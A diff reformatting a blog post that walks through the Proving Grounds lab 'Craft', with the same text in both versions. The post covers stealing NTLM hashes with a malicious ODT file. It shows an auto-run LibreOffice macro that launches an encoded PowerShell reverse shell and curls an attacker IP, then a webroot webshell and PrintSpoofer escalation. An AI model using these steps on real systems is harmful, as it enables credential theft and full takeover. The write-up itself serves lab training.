@@ -1,1 +1,141 @@
-<html><head><meta charset="utf-8"></head><body><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Shell as TheCyberGeek</u></strong></span></p><p>&nbsp;</p><p>&nbsp;</p><p>The only port open is port 80 which is hosting a webpage.</p><p>&nbsp;</p><p>We have an uploads directory and can upload ODT files</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1622/646;" src="../img/posts/2025-03-01-Craft(PG)/01-0caf28fd9b.png" width="1622" height="646"></figure><p>&nbsp;</p><p>Uploading a random file shows us only ODT files are allow</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:685/183;" src="../img/posts/2025-03-01-Craft(PG)/02-b0150958f8.png" width="685" height="183"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Using this script above or this website we can manually create an exploit to steal the NTLM creds of whoever opens the file</p><p><a href="https://github.com/rmdavy/badodf/blob/master/badodt.py">https://github.com/rmdavy/badodf/blob/master/badodt.py</a></p><p>https://secureyourit.co.uk/wp/2018/05/01/creating-malicious-odt-files/</p><p>&nbsp;</p><p>&nbsp;</p><p>Run responder and we capture the hash for thecybergeek</p><figure class="image"><img style="aspect-ratio:1749/441;" src="../img/posts/2025-03-01-Craft(PG)/03-f7c150eac8.png" width="1749" height="441"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>We cant get this hash to crack so im going to look for other exploits. I remembered doing a similar machine for Hack The Box a while back called Mailing which involved creating a malicious ODT file with an embedded macro which allowed RCE.</p><p>&nbsp;</p><p>On my windows machine I open libre office and create a new document and create this macro below. The first line opens a reverse shell, its a bit complicated so I create a second line which does a simple curl command just in case the reverse shell doesnt work for whatever reason.</p><p>&nbsp;</p><p><code>REM &nbsp;***** &nbsp;BASIC &nbsp;*****</code></p><p><code>Sub Main</code><br><code>&nbsp; &nbsp;Shell("cmd /c powershell -Exec ByPass -Nol -Enc &nbsp;&lt;base64 encoded shell.ps1&gt;")</code><br><code>&nbsp; &nbsp;Shell("cmd /c curl http://192.168.45.231/RCECONFIRMED")</code><br><code>End Sub</code><br>&nbsp;</p><p>&nbsp;</p><p>Then we set the macro to run when the document is opened(I tested this on my machine using the curl command and confirmed it worked). When I uploaded it to the site, nothing worked. However it worked perfectly fine on my up to date windows machine. In the initial script I had an extra set of single quotes which caused it to break on the CTF, but still worked on my machine for some reason.</p><p>&nbsp;</p><p>Correct command - <code>Shell("cmd /c curl </code><a href="http://192.168.45.231/RCECONFIRMED&quot;)"><code>http://192.168.45.231/RCECONFIRMED")</code></a></p><p>“Incorrect” command - <code>Shell("cmd /c 'curl http://192.168.45.231/RCECONFIRMED'")</code></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:459/146;" src="../img/posts/2025-03-01-Craft(PG)/04-91455a29f3.png" width="459" height="146"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Once I solved that I uploaded it to the site and got a shell and callback from the curl command.</p><p>&nbsp;</p><figure class="image"><img style="aspect-ratio:1198/1118;" src="../img/posts/2025-03-01-Craft(PG)/05-503b3fdd37.png" width="1198" height="1118"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Shell as Apache</u></strong></span></p><p>&nbsp;</p><p>We can get the user flag now and we notice another user directory named Apache which is really strange.</p><p>&nbsp;</p><p>We can get access to this user by uploading a webshell in the webroot directory. There is an uploads directory but theres a cleanup script deleting uploads instantly so we want to upload it to the root directory below.</p><p>C:\xampp\htdocs\</p><p>&nbsp;</p><p>&nbsp;</p><p>Then we access our webshell at</p><p>http://192.168.110.169/webshell.php</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:971/216;" src="../img/posts/2025-03-01-Craft(PG)/06-209f7006a0.png" width="971" height="216"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>Getting a shell using the same powershell method above and we have SeImpersonate</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1514/1065;" src="../img/posts/2025-03-01-Craft(PG)/07-744bb94edb.png" width="1514" height="1065"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Shell as Administrator</u></strong></span></p><p>&nbsp;</p><p>The machine is running windows server 2019 so I am going to use PrintSpoofer.exe to exploit SeImpersonate</p><p><a href="https://github.com/dievus/printspoofer/blob/master/PrintSpoofer.exe">https://github.com/dievus/printspoofer/blob/master/PrintSpoofer.exe</a></p><p>&nbsp;</p><p><code>.\PrintSpoofer.exe -i -c cmd</code></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:944/507;" src="../img/posts/2025-03-01-Craft(PG)/08-6eb560c535.png" width="944" height="507"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>Now we can grab the final flag and finish out this machine.</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:507/269;" src="../img/posts/2025-03-01-Craft(PG)/09-63a277ebc3.png" width="507" height="269"></figure><p>&nbsp;</p><p>&nbsp;</p></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>PG: Craft | HackWithJordan</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="../assets/css/syntax.css">
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+
+        .post {
+            width: 100%;
+            max-width: 900px;
+        }
+
+        .terminal {
+            background: #98AFC7;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            max-width: 100%;
+            white-space: pre-wrap;
+            word-break: break-word;
+            font-family: monospace;
+            margin: 15px 0;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            margin: 15px 0;
+            display: block;
+        }
+
+        p {
+            margin: 15px 0;
+            line-height: 1.5;
+            overflow-wrap: anywhere;
+        }
+
+        code {
+            overflow-wrap: anywhere;
+        }
+    </style>
+</head>
+<body>
+
+    <article class="post">
+        <header style="display: flex; align-items: center; gap: 20px;">
+            <img src="../img/posts/2025-03-01-Craft(PG)/01-0caf28fd9b.png" alt="PG: Craft cover" style="height: 80px; border-radius: 4px;">
+            <div>
+                <h1 style="margin: 0;">PG: Craft</h1>
+                <div class="post-meta">March 1, 2025 &bull; PG</div>
+            </div>
+        </header>
+
+        <h1 style="color:red;">Shell as TheCyberGeek</h1>
+
+        <p>The only port open is port 80 which is hosting a webpage.</p>
+
+        <p>We have an uploads directory and can upload ODT files</p>
+
+        <img alt="Screenshot 1" height="646" src="../img/posts/2025-03-01-Craft(PG)/01-0caf28fd9b.png" style="aspect-ratio:1622/646;" width="1622"/>
+
+        <p>Uploading a random file shows us only ODT files are allow</p>
+
+        <img alt="Screenshot 2" height="183" src="../img/posts/2025-03-01-Craft(PG)/02-b0150958f8.png" style="aspect-ratio:685/183;" width="685"/>
+
+        <p>Using this script above or this website we can manually create an exploit to steal the NTLM creds of whoever opens the file</p>
+
+        <p><a href="https://github.com/rmdavy/badodf/blob/master/badodt.py">https://github.com/rmdavy/badodf/blob/master/badodt.py</a></p>
+
+        <p>https://secureyourit.co.uk/wp/2018/05/01/creating-malicious-odt-files/</p>
+
+        <p>Run responder and we capture the hash for thecybergeek</p>
+
+        <img alt="Screenshot 3" height="441" src="../img/posts/2025-03-01-Craft(PG)/03-f7c150eac8.png" style="aspect-ratio:1749/441;" width="1749"/>
+
+        <p>We cant get this hash to crack so im going to look for other exploits. I remembered doing a similar machine for Hack The Box a while back called Mailing which involved creating a malicious ODT file with an embedded macro which allowed RCE.</p>
+
+        <p>On my windows machine I open libre office and create a new document and create this macro below. The first line opens a reverse shell, its a bit complicated so I create a second line which does a simple curl command just in case the reverse shell doesnt work for whatever reason.</p>
+
+        <pre class="terminal"><code>REM  *****  BASIC  *****</code></pre>
+
+        <p><code>Sub Main</code><br/><code>   Shell("cmd /c powershell -Exec ByPass -Nol -Enc  &lt;base64 encoded shell.ps1&gt;")</code><br/><code>   Shell("cmd /c curl http://192.168.45.231/RCECONFIRMED")</code><br/><code>End Sub</code><br/> </p>
+
+        <p>Then we set the macro to run when the document is opened(I tested this on my machine using the curl command and confirmed it worked). When I uploaded it to the site, nothing worked. However it worked perfectly fine on my up to date windows machine. In the initial script I had an extra set of single quotes which caused it to break on the CTF, but still worked on my machine for some reason.</p>
+
+        <p>Correct command - <code>Shell("cmd /c curl </code><a href='http://192.168.45.231/RCECONFIRMED")'><code>http://192.168.45.231/RCECONFIRMED")</code></a></p>
+
+        <p>“Incorrect” command - <code>Shell("cmd /c 'curl http://192.168.45.231/RCECONFIRMED'")</code></p>
+
+        <img alt="Screenshot 4" height="146" src="../img/posts/2025-03-01-Craft(PG)/04-91455a29f3.png" style="aspect-ratio:459/146;" width="459"/>
+
+        <p>Once I solved that I uploaded it to the site and got a shell and callback from the curl command.</p>
+
+        <img alt="Screenshot 5" height="1118" src="../img/posts/2025-03-01-Craft(PG)/05-503b3fdd37.png" style="aspect-ratio:1198/1118;" width="1198"/>
+
+        <h1 style="color:red;">Shell as Apache</h1>
+
+        <p>We can get the user flag now and we notice another user directory named Apache which is really strange.</p>
+
+        <p>We can get access to this user by uploading a webshell in the webroot directory. There is an uploads directory but theres a cleanup script deleting uploads instantly so we want to upload it to the root directory below.</p>
+
+        <p>C:\xampp\htdocs\</p>
+
+        <p>Then we access our webshell at</p>
+
+        <p>http://192.168.110.169/webshell.php</p>
+
+        <img alt="Screenshot 6" height="216" src="../img/posts/2025-03-01-Craft(PG)/06-209f7006a0.png" style="aspect-ratio:971/216;" width="971"/>
+
+        <p>Getting a shell using the same powershell method above and we have SeImpersonate</p>
+
+        <img alt="Screenshot 7" height="1065" src="../img/posts/2025-03-01-Craft(PG)/07-744bb94edb.png" style="aspect-ratio:1514/1065;" width="1514"/>
+
+        <h1 style="color:red;">Shell as Administrator</h1>
+
+        <p>The machine is running windows server 2019 so I am going to use PrintSpoofer.exe to exploit SeImpersonate</p>
+
+        <p><a href="https://github.com/dievus/printspoofer/blob/master/PrintSpoofer.exe">https://github.com/dievus/printspoofer/blob/master/PrintSpoofer.exe</a></p>
+
+        <pre class="terminal"><code>.\PrintSpoofer.exe -i -c cmd</code></pre>
+
+        <img alt="Screenshot 8" height="507" src="../img/posts/2025-03-01-Craft(PG)/08-6eb560c535.png" style="aspect-ratio:944/507;" width="944"/>
+
+        <p>Now we can grab the final flag and finish out this machine.</p>
+
+        <img alt="Screenshot 9" height="269" src="../img/posts/2025-03-01-Craft(PG)/09-63a277ebc3.png" style="aspect-ratio:507/269;" width="507"/>
+    </article>
+
+</body>
+</html>
